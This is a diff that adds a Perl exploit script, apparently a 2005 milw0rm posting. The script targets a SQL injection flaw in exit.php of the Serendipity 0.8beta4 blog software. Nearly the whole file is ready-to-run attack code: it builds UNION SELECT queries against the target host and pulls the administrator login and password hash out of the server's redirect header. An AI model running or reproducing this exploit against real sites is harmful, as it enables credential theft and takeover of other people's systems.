@@ -1,0 +1,64 @@
+#!/usr/bin/perl
+# Serendipity 0.8beta4 exit.php SQL Injection exploit
+# (c) ADZ Security Team 2004-2005
+# (c) kreon 2005
+# http://adz.void.ru/
+# kre0n@mail.ru
+# Public :)
+
+print "\n\n";
+print "# Serendipity 0.8beta4 exit.php SQL Injection exploit\n";
+print "# (C) ADZ Security Team 2004-2005\n";
+print "# (C) kreon 2005\n";
+
+use IO::Socket;
+use Getopt::Std;
+
+getopt("h:d:p:t:");
+
+$opt_p ||= 80;
+$opt_d ||= "/";
+$opt_t ||= "serendipity_";
+
+if(!$opt_h) {
+    die("# Usage: $0 -h <host> [-d <dir>] [-p <port>] [-t table_prefix]\n");
+}
+
+$sqlpass = "?entry_id=1&url_id=1%20UNION%20SELECT%20password%20FROM%20".$opt_t."authors%20WHERE%20userlevel=255/*";
+$sqllogin = "?entry_id=1&url_id=1%20UNION%20SELECT%20username%20FROM%20".$opt_t."authors%20WHERE%20userlevel=255/*";
+
+print "# Host: $opt_h\n";
+print "# Dir: $opt_d\n";
+print "# Port: $opt_p\n";
+print "# Prefix: $opt_t\n";
+
+$Q1 = "GET ".$opt_d."/exit.php".$sqllogin." HTTP/1.0\n";
+$Q1 .= "Host: ".$opt_h."\n\n";
+
+$Q2 = "GET ".$opt_d."/exit.php".$sqlpass." HTTP/1.0\n";
+$Q2 .= "Host: ".$opt_h."\n\n";
+
+$s = IO::Socket::INET->new(Proto => 'tcp', PeerAddr => $opt_h, PeerPort => $opt_p) or die("Can't connect!");
+$s->send($Q1);
+$s->recv($txt, 1024);
+if($txt =~ m/location: (\S+)/i) {
+    $login =  $1;
+}
+
+$s = IO::Socket::INET->new(Proto=>'tcp', PeerAddr => $opt_h, PeerPort => $opt_p) or die("Can't connect!");
+$s->send($Q2);
+$s->recv($txt, 1024);
+if($txt =~ m/location: (\S+)/i) {
+    $pass = $1;
+}
+if(!$login || !$pass || $login =~ m/http:\/\//i || $pass =~ m/http:\/\//i) {
+    print "# Failed :(\n";
+    exit;
+}
+
+print "# Succeed :)\n";
+print "# Login: $login\n";
+print "# Pass Hash: $pass\n";
+print "\n";
+
+# milw0rm.com [2005-04-13]
